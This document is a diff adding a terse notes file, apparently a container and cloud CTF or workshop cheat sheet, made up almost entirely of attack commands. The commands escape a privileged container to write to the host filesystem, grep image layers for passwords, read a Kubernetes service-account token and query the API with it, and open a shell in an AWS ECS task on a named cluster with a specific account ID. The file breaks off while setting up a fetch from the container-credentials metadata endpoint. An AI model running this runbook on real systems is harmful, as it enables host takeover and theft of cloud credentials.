@@ -1,0 +1,65 @@
+10: Attack
+
+1.1: Privileged Container
+
+docker run -it --privileged -v /:/host alpine sh
+ls /host
+echo "owned" > /host/tmp/pwned.txt
+
+
+1.2 Secretos de las imágenes
+
+podman history myimage
+podman  save myimage | tar xvf -
+grep -R "password" .
+
+1.3 SA de k8s
+
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
+cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+
+export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+export API_SERVER="https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"
+
+ curl -k   -H "Authorization: Bearer $TOKEN"   $API_SERVER/api
+ curl -k   -H "Authorization: Bearer $TOKEN"   $API_SERVER/api/v1/namespaces/default/pods
+
+1.4. Using our tools
+kubectl cp /usr/bin/kubectl default/ubuntu:/usr/bin/kubectl
+
+
+1.5 Accesing the Host from the podman
+
+kubectl exec -it escape -- sh
+cd /host
+ls
+
+
+1.6 Cloud Attacks!
+1.6.1 Getting into a ecs pod
+aws ecs update-cluster \
+  --cluster arn:aws:ecs:sa-east-1:822214488732:cluster/ctf-services-ecs-cluster \
+  --configuration '{"executeCommandConfiguration": {"logging": "DEFAULT"}}' \
+  --profile soli-demo \
+  --region sa-east-1
+
+aws ecs list-services --cluster arn:aws:ecs:sa-east-1:822214488732:cluster/ctf-services-ecs-cluster --profile soli-demo --region sa-east-1 
+
+aws ecs update-service \
+  --cluster arn:aws:ecs:sa-east-1:822214488732:cluster/ctf-services-ecs-cluster \
+  --service arn:aws:ecs:sa-east-1:822214488732:service/ctf-services-ecs-cluster/admin \
+  --enable-execute-command \
+  --force-new-deployment \
+  --profile soli-demo \
+  --region sa-east-1
+
+
+aws ecs list-tasks   --cluster arn:aws:ecs:sa-east-1:822214488732:cluster/ctf-services-ecs-cluster   --service arn:aws:ecs:sa-east-1:822214488732:service/ctf-services-ecs-cluster/admin   --profile soli-demo   --region sa-east-1
+
+
+aws ecs execute-command --cluster arn:aws:ecs:sa-east-1:822214488732:cluster/ctf-services-ecs-cluster --task arn:aws:ecs:sa-east-1:822214488732:task/ctf-services-ecs-cluster/9051429d71da40d3ad1aaf4279f5a421 --profile soli-demo --region sa-east-1 --command /bin/bash --interactive
+
+#####
+1.6.2 From the pod to the sky
+export CREDS_URL="http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
